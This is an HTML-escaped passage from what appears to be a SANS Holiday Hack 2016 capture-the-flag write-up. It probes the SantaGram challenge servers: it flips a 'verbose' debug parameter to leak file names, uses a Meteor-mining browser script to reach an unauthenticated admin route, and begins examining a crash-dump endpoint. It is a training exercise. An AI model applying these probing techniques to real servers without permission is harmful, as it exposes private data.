class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see in the server's reponse that there's a &lt;code&gt;verbose&lt;/code&gt; parameter
set to &lt;code&gt;false&lt;/code&gt;. What if we set &lt;code&gt;&amp;quot;verbose&amp;quot;:true&lt;/code&gt; in our request
(me loves some verbosity)?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;dev.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;159&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227001619+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48663448&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.6.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Tue, 27 Dec 2016 00:09:10 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;755&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227000910&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000910-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227001619+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48663448&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;files&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161224235959-0.mp3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226231736-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232005-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232057-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232243-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232507-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232516-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226233655-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234235-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234246-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234259-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234313-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000501-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000603-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000910-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes! Many more informations were sent back, including the name of our audio
file, &lt;code&gt;debug-20161224235959-0.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can now download our audio file at this URL: &lt;a class="reference external" href="http://dev.northpolewonderland.com/debug-20161224235959-0.mp3"&gt;http://dev.northpolewonderland.com/debug-20161224235959-0.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="dev_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_audio_file.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-banner-ad-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://ads.northpolewonderland.com/"&gt;The Banner Ad Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The SantaGram bug bounty program is apparently running an ad server, so as to
display ad in the Android application. If we go to this ad web server, we can
see that it's running the &lt;a class="reference external" href="https://www.meteor.com/"&gt;Meteor Javascript framework&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;__meteor-css__&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/d1281f37fbafb6db67a052e58c901679c5cabcc2.css?meteor_css_resource=true&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;X-UA-Compatible&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IE=edge&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewport&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;width=device-width, initial-scale=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags--&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Holiday Hack&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Ad Nauseam - Stupid Ads for Stupid People&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;__meteor_runtime_config__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;decodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%7B%22meteorRelease%22%3A%22METEOR%401.4.2.3%22%2C%22meteorEnv%22%3A%7B%22NODE_ENV%22%3A%22production%22%2C%22TEST_METADATA%22%3A%22%7B%7D%22%7D%2C%22PUBLIC_SETTINGS%22%3A%7B%7D%2C%22ROOT_URL%22%3A%22http%3A%2F%2Fads.northpolewonderland.com%22%2C%22ROOT_URL_PATH_PREFIX%22%3A%22%22%2C%22appId%22%3A%221vgh1e61x7h692h4hyt1%22%2C%22autoupdateVersion%22%3A%22537dcf6b4594db16ea2d99d0a920f2deeb7dc9f1%22%2C%22autoupdateVersionRefreshable%22%3A%2205c3f7dba9f3e15efa3d971acf18cab901dc0505%22%2C%22autoupdateVersionCordova%22%3A%22none%22%7D&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/fedc8e9f69dab9d81a4f227d6ec76567fcb56231.js?meteor_js_resource=true&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;What a crazy random happenstance, it just so happens that &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/06/mining-meteor"&gt;an article&lt;/a&gt;
about pentesting Meteor-based web applications was recently published on the
SANS blog.&lt;/p&gt;
&lt;p&gt;So, let's spin &lt;a class="reference external" href="https://tampermonkey.net/"&gt;Tampermonkey&lt;/a&gt;, with the &lt;a class="reference external" href="https://github.com/nidem/MeteorMiner/"&gt;Meteor
Miner&lt;/a&gt; script, to see what kind of
informations we can extract from the applications. On this screenshot, we can
see that we have access to the quotes printed on the front page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_front.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_front.png" /&gt;
&lt;p&gt;We can also see that there's an &lt;a class="reference external" href="http://ads.northpolewonderland.com/admin/quotes"&gt;/admin/quotes&lt;/a&gt;
page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_admin_route.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_route.png" /&gt;
&lt;p&gt;If we go to it, even if we're supposed to be logged in, we can see that
there's one quote more than on the front page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_admin_page.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_page.png" /&gt;
&lt;p&gt;In one of these quotes, we can see that there's a link to the MP3 file we want.
We can then download the MP3 file from this URL: &lt;a class="reference external" href="http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3"&gt;http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="ads_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_result.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-uncaught-exception-handler-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://ex.northpolewonderland.com/exception.php"&gt;The Uncaught Exception Handler Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When the Android application encounters a Java exception, it's sent to an
exception handling server: &lt;a class="reference external" href="http://ex.northpolewonderland.com/exception.php"&gt;http://ex.northpolewonderland.com/exception.php&lt;/a&gt;.
For example, when I first tried to run the Santagram application on a virtual
Android device, this exception was sent (some problem with the resolution of
my virtual device):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;3860&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Canvas: trying to draw too large(113246208bytes) bitmap.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Canvas: trying to draw too large(113246208bytes) bitmap.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;java.lang.RuntimeException: Canvas: trying to draw too large(113246208bytes) bitmap.\n\tat android.view.DisplayListCanvas.throwIfCannotDraw(DisplayListCanvas.java:260)\n\tat android.graphics.Canvas.drawBitmap(Canvas.java:1415)\n\tat android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:528)\n\tat android.widget.ImageView.onDraw(ImageView.java:1316)\n\tat android.view.View.draw(View.java:17185)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.draw(View.java:17188)\n\tat com.android.internal.policy.DecorView.draw(DecorView.java:753)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.ThreadedRenderer.updateViewTreeDisplayList(ThreadedRenderer.java:648)\n\tat android.view.ThreadedRenderer.updateRootDisplayList(ThreadedRenderer.java:654)\n\tat android.view.ThreadedRenderer.draw(ThreadedRenderer.java:762)\n\tat android.view.ViewRootImpl.draw(ViewRootImpl.java:2800)\n\tat android.view.ViewRootImpl.performDraw(ViewRootImpl.java:2608)\n\tat android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:2215)\n\tat android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1254)\n\tat android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:6337)\n\tat android.view.Choreographer$CallbackRecord.run(Choreographer.java:874)\n\tat android.view.Choreographer.doCallbacks(Choreographer.java:686)\n\tat android.view.Choreographer.doFrame(Choreographer.java:621)\n\tat android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:860)\n\tat android.os.Handler.handleCallback(Handler.java:751)\n\tat android.os.Handler.dispatchMessage(Handler.java:95)\n\tat android.os.Looper.loop(Looper.java:154)\n\tat android.app.ActivityThread.main(ActivityThread.java:6119)\n\tat java.lang.reflect.Method.invoke(Native Method)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:886)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:776)\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;model&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Android SDK built for x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span 